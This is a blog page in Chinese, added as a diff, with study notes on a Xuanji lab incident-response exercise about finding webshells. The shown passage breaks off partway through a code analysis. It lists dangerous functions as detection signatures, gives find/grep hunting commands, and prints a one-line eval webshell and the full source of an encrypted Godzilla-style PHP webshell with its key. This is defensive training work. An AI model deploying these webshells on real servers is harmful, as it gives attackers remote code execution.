@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第一章 应急响应-webshell查杀 简介 12345&gt;靶机账号密码 root xjwebshell&gt;1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;&gt;2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;&gt;3.黑客隐藏shell的完整路径的md5 fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="玄机靶场第一章学习笔记">
+<meta property="og:url" content="https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Chimedal">
+<meta property="og:description" content="第一章 应急响应-webshell查杀 简介 12345&gt;靶机账号密码 root xjwebshell&gt;1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;&gt;2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;&gt;3.黑客隐藏shell的完整路径的md5 fl">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-d8f1aa1e03a3b2b3939160eb0f9b6d85_1440w.png?source=d16d100b">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-f22b3eb28c713e7d9507ac12aedccb94_1440w.png?source=d16d100b">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-a21b1e081f42ab40cb58c21384352eae_1440w.jpg?source=d16d100b">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-725210ba38a3cee6bbab2df9268e62f1_1440w.png">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-627ac4bf8381f5c9811d4ceae6ca059b_1440w.png">
+<meta property="article:published_time" content="2025-04-03T15:40:00.000Z">
+<meta property="article:modified_time" content="2025-04-03T15:40:00.000Z">
+<meta property="article:author" content="Chimedal">
+<meta property="article:tag" content="SecurityResponse">
+<meta property="article:tag" content="玄机靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-d8f1aa1e03a3b2b3939160eb0f9b6d85_1440w.png?source=d16d100b">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>玄机靶场第一章学习笔记</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/link/">Link</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/30/Hospital/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=玄机靶场第一章学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=玄机靶场第一章学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=玄机靶场第一章学习笔记&body=Check out this article: https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=玄机靶场第一章学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=玄机靶场第一章学习笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">第一章 应急响应-webshell查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41"><span class="toc-number">1.1.</span> <span class="toc-text">步骤1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%90%AF%E5%8A%A8%E4%BC%9A%E8%AF%9D%E4%B8%8E%E7%A6%81%E7%94%A8%E9%94%99%E8%AF%AF%E6%8A%A5%E5%91%8A"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">1. 启动会话与禁用错误报告</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-encode-%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">2. encode 函数定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96%E4%B8%8E%E5%A4%84%E7%90%86"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">3. 数据获取与处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E4%B8%8E%E4%BC%9A%E8%AF%9D%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">4. 数据加密与会话检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%BD%9C%E5%9C%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">5. 潜在的安全问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42"><span class="toc-number">1.2.</span> <span class="toc-text">步骤2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43"><span class="toc-number">1.3.</span> <span class="toc-text">步骤3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44"><span class="toc-number">1.4.</span> <span class="toc-text">步骤4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">第一章 应急响应-Linux日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-1"><span class="toc-number">2.1.</span> <span class="toc-text">步骤1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E8%BD%AE%E8%BD%AC%E6%9C%BA%E5%88%B6%EF%BC%88logrotate%EF%BC%89%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">日志轮转机制（logrotate）简介：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%94%A8%E5%AE%83%E4%BB%AC%EF%BC%9F"><span class="toc-number">2.1.2.</span> <span class="toc-text">怎么用它们？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">2.1.3.</span> <span class="toc-text">完整命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E9%83%A8%E5%88%86%E5%90%AB%E4%B9%89%EF%BC%9A"><span class="toc-number">2.1.4.</span> <span class="toc-text">各部分含义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-number">2.1.5.</span> <span class="toc-text">最终效果：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%94%A8%E5%BB%BA%E8%AE%AE%EF%BC%9A"><span class="toc-number">2.1.6.</span> <span class="toc-text">实用建议：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-1"><span class="toc-number">2.2.</span> <span class="toc-text">步骤2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-1"><span class="toc-number">2.3.</span> <span class="toc-text">步骤3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A41"><span class="toc-number">2.3.1.</span> <span class="toc-text">命令1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A42"><span class="toc-number">2.3.2.</span> <span class="toc-text">命令2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-1"><span class="toc-number">2.4.</span> <span class="toc-text">步骤4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A45"><span class="toc-number">2.5.</span> <span class="toc-text">步骤5</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">3.</span> <span class="toc-text">第一章 应急响应- Linux入侵排查</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-2"><span class="toc-number">3.1.</span> <span class="toc-text">步骤1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">3.1.1.</span> <span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-2"><span class="toc-number">3.2.</span> <span class="toc-text">步骤2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-2"><span class="toc-number">3.3.</span> <span class="toc-text">步骤3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-2"><span class="toc-number">3.4.</span> <span class="toc-text">步骤4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A45-1"><span class="toc-number">3.5.</span> <span class="toc-text">步骤5</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E6%96%87%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">本文参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        玄机靶场第一章学习笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Chimedal</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-03T15:40:00.000Z" class="dt-published" itemprop="datePublished">2025-04-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/SecurityResponse/" rel="tag">SecurityResponse</a>, <a class="p-category" href="/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/" rel="tag">玄机靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="第一章-应急响应-webshell查杀"><a href="#第一章-应急响应-webshell查杀" class="headerlink" title="第一章 应急响应-webshell查杀"></a>第一章 应急响应-webshell查杀</h1><blockquote>
+<p>简介</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;靶机账号密码 root xjwebshell</span><br><span class="line">&gt;1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;</span><br><span class="line">&gt;2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;</span><br><span class="line">&gt;3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx</span><br><span class="line">&gt;4.黑客免杀马完整路径 md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure></div></blockquote>
+<h2 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h2><blockquote>
+<p>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p>
+</blockquote>
+<p>基础知识：<strong>代码特征</strong></p>
+<blockquote>
+<ol>
+<li>可疑函数调用</li>
+</ol>
+<p>WebShell通常会使用一些危险的函数来执行系统命令或代码，如：</p>
+<pre><code>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()
+ASP: Execute(), Eval(), CreateObject()
+JSP: Runtime.getRuntime().exec()
+</code></pre>
+<ol start="2">
+<li>编码和解码</li>
+</ol>
+<p>WebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：</p>
+<div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;encoded_string&#x27;</span>));</span><br></pre></td></tr></table></figure></div>
+<ol start="3">
+<li><strong>文件操作</strong></li>
+</ol>
+<p>WebShell可能会包含文件操作函数，用于读取、写入或修改文件：     </p>
+<ul>
+<li>PHP: <code>fopen()</code>, <code>fwrite()</code>, <code>file_get_contents()</code>, <code>file_put_contents()</code></li>
+<li>ASP: <code>FileSystemObject</code></li>
+</ul>
+<ol start="4">
+<li>网络操作</li>
+</ol>
+<p>WebShell可能会包含网络操作函数，用于与远程服务器通信：     </p>
+<ul>
+<li>PHP: <code>fsockopen()</code>, <code>curl_exec()</code>, <code>file_get_contents(&#39;http://...&#39;)</code></li>
+<li>ASP: <code>WinHttp.WinHttpRequest</code></li>
+</ul>
+<p>上面刚刚也说了我们可以尝试定位一些特殊的后缀文件，例如：.asp、.php、.jsp、.aspx。</p>
+<p>命令：</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.jsp&quot;</span> | xargs grep <span class="string">&quot;exec(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.asp&quot;</span> | xargs grep <span class="string">&quot;execute(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.aspx&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line"> </span><br><span class="line">//对于免杀Webshell，可以查看是否使用编码</span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;base64_decode&quot;</span> </span><br></pre></td></tr></table></figure></div></blockquote>
+<p>先使用Xshell连接</p>
+<p>再使用命令<code>find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</code></p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -name &quot;*.php&quot;</span><br><span class="line"></span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval&quot;</span><br><span class="line"></span><br><span class="line">find ./ -type f -name &quot;*.php&quot; -exec grep &quot;eval&quot; &#123;&#125; +</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>xargs：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，xargs将find命令找到的文件列表作为参数传递给grep命令。</p>
+<p>grep “eval(“：grep命令用于搜索文本，并输出匹配的行。这里”eval(“是grep命令的搜索模式，用于查找包含eval(字符串的行。</p>
+</blockquote>
+<p>找到一个<code>&lt;?php phpinfo();@eval($_REQUEST[1]);?&gt;</code></p>
+<p><img src="https://pic1.zhimg.com/80/v2-d8f1aa1e03a3b2b3939160eb0f9b6d85_1440w.png?source=d16d100b"></p>
+<p>很明显shell.php是一个病毒文件，定位一下它的目录过发现没什么，找找其他的php文件</p>
+<p>最后终于在gz.php里面发现了；</p>
+<div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span></span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>这段 PHP 代码主要涉及处理 HTTP 请求中的数据，并通过对数据进行编码、解码与会话存储实现动态执行某些操作。具体来说，代码看似用于某种类型的远程代码执行机制，其中使用了 <code>eval()</code> 函数来执行动态生成的代码。下面对代码逐行进行分析。</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="1-启动会话与禁用错误报告"><a href="#1-启动会话与禁用错误报告" class="headerlink" title="1. 启动会话与禁用错误报告"></a>1. 启动会话与禁用错误报告</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>@session_start();</code>：启动会话处理，<code>@</code> 符号用于抑制可能的错误（如会话已经启动的警告）。</li>
+<li><code>@set_time_limit(0);</code>：设置脚本的最大执行时间为 0，意味着脚本可以无限制地运行。</li>
+<li><code>@error_reporting(0);</code>：关闭所有错误报告，这样运行时的错误信息不会被显示出来，通常用于隐藏潜在的错误信息，避免被外部用户发现漏洞。</li>
+</ul>
